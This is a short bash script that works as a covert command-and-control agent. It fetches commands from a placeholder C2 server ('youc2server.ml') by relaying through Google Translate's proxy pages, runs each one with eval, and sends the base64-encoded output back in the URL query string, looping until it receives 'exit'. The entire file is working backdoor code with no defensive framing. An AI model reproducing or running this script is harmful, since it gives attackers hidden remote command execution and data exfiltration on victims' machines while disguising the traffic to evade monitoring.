#!/bin/bash

running=true
user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
c2server="http://youc2server.ml/"
result=""

function getfirsturl(){
  url="https://translate.google.com/translate?&anno=2&u=$c2server$result"
  first=$(curl --silent "$url" -H "$user_agent" | xmllint --html --xpath '//iframe/@src' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g' )
} 

function getsecondurl(){
  second=$(curl --silent -L "$first" -H "$user_agent"  | xmllint --html --xpath '//a/@href' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g')
}

function getcommand(){
  command=$(curl --silent $second -H "$user_agent" )
  command1=$(echo $command | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
  command2=$(echo $command | xmllint --html --xpath '//body/text()' - 2>/dev/null)
  if [[ "$command1" ]];then
    command="$command1"
  else
    command="$command2"
  fi
}

function talktotranslate(){
  getfirsturl
  getsecondurl
  getcommand
}

function main(){
  result=""
  talktotranslate
  if [[ "$command" ]];then
    if [[ "$command" == "exit" ]];then
      running=false 
    fi
    outputb64=$(eval "$command|base64|tr -d ' '|tr -d '\n' " 2>/dev/null)
    if [[ "$outputb64" ]];then
      result="?result=$outputb64"
      talktotranslate
    fi
  fi
}

while "$running";do
  main
done
